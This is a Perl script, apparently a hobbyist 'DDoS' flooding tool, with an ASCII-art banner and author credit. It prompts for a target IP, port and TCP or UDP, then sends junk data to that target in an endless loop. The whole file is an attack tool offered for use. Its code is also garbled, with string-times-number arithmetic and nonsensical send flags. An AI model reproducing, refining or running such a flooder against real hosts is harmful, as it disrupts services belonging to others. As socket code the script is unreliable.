#!/usr/bin/perl
#==============INFO==============#
#         https://www.wendev89.site
#
#
#=========== Use Modules ==========#
use IO::Socket;
use Scalar::Util qw(looks_like_number);

#=== Clear Screen ===#
system("cls || clear");
#Script Banner================================================================
print q{ 

███▀░░░░░░░░░░░░░░░░░▀███   ooooooooo.                      oooo
██│░░░░░░░░░░░░░░░░░░░│██   `888   `Y88.                    `888 
█▌│░░░░░░WenDev89░░░░░░│▐█    888   .d88'  .ooooo.  oooo d8b  88
█░└┐░░░░░░░░░░░░░░░░░┌┘░█    888ooo88P'  d88' `88b `888""8P  888
█░░└┐░░░░░░░░░░░░░░░┌┘░░█    888         888ooo888  888      888
█░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░█    888         888    .o  888      888
█▌░│██████▌░░░▐██████│░▐█   o888o        `Y8bod8P' d888b    o888o 
██░│▐███▀▀░░▄░░▀▀███▌│░██
█▀─┘░░░░░░░▐█▌░░░░░░░└─▀█   888888ba  888888ba           .d88888b
█▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄█   88    `8b 88    `8b          88.    "' 
███▄─┘██▌░░░░░░░▐██└─▄███   88     88 88     88 .d8888b. `Y88888b. 
████░░▐█─┬┬┬┬┬┬┬─█▌░░████   88     88 88     88 88'  `88       `8b 
███▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███   88    .8P 88    .8P 88.  .88 d8'   .8P 
████▄░░░└┴┴┴┴┴┴┴┘░░░▄████   8888888P  8888888P  `88888P'  Y88888P
██████▄░░░░░░░░░░░▄██████
█████████████████████████   [:]    Author   ~>   ☣  山乇几ᗪ乇 V  ☣   [:] 

};
# Check Intenret Connection !
my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
	'PeerPort'=>80, 
	'Timeout'=>2, 
	'proto'=>'tcp');
if(!(defined $check && $check)){
	print("[-] Internet Status[ Not Connected ]");
	print("\n[!] Error: Please Check Your Internet Connection !!!");
	exit(1);
}
$check->close();
# INPUT TARGET INFO ==============================================
print "\n===============================";
print "\n[~] Enter TargetIP: "; # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Enter TargetIP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host";
print "\n===============================";
print "\n[~] Enter Port: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
 print "   [!] Enter PORT?: ";       
 $port = <STDIN>;
 chomp ($port); 
} 
print "PORT ==> $port";
print "\n===============================";
print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Enter Protockol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(1);

$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
system("clear || cls");
print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep(1);
while (1) {
  if(grep{$proto eq $_} 'TCP','tcp'){
       $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
        for($i=0; $i<=500; $i++){
            $size = rand() * 8921873 * 99919988;
            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
        }

  }else{
            $size = rand() * 8921873 * 99919988;
            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
 }
}
$sock->close()
##############################################################
#####################                #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by Oseid Aldary
#Have a nice day :)
#GoodBye